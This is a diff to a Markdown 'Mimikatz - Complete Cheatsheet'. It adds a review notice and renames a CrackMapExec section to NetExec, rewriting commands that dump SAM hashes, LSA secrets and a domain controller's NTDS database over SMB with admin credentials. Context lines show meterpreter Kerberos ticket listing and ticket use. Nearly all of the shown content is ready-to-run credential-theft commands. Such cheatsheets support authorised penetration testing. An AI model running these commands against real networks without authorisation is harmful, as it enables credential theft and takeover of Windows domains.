@@ -1,5 +1,7 @@
 # 🔑 Mimikatz - Complete Cheatsheet
 
+> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
+
 ```
   ███╗   ███╗██╗███╗   ███╗██╗██╗  ██╗ █████╗ ████████╗███████╗
   ████╗ ████║██║████╗ ████║██║██║ ██╔╝██╔══██╗╚══██╔══╝╚══════╝
@@ -155,17 +157,17 @@ meterpreter > kerberos_ticket_list
 meterpreter > kerberos_ticket_use /path/to/ticket.kirbi
 ```
 
-### 4. CrackMapExec
+### 4. NetExec
 
 ```bash
 # Dump SAM
-crackmapexec smb 192.168.1.0/24 -u admin -p password --sam
+nxc smb 192.168.1.0/24 -u admin -p password --sam
 
 # Dump LSA
-crackmapexec smb 192.168.1.0/24 -u admin -p password --lsa
+nxc smb 192.168.1.0/24 -u admin -p password --lsa
 
 # Dump NTDS
-crackmapexec smb dc01.domain.local -u admin -p password --ntds
+nxc smb dc01.domain.local -u admin -p password --ntds
 ```
 
 ### 5. From Memory Dump
